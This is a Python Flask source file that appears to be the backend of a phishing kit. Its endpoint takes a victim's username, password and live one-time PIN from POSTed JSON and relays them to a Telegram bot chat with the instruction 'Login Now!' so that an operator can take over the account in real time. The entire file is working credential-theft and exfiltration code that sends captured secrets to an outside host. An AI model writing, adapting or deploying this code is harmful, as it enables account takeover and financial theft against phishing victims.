from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Settings -> Environment Variables
TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api', methods=['POST'])
def handle():
    data = request.get_json(force=True)
    user = data.get('u')
    dtype = data.get('t')
    
    msg = f"🛰 **SYSTEM SIGNAL RECEIVED**\n👤 User: `{user}`\n"
    
    if dtype == 'OTP_LIVE':
        msg += f"🔢 **PIN:** `{data.get('o')}`\n✅ Action: Login Now!"
    else:
        msg += f"🔑 **Key:** `{data.get('p')}`\n📊 **Stage:** {dtype}"

    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

def handler(req, res):
    return app(req, res)
    
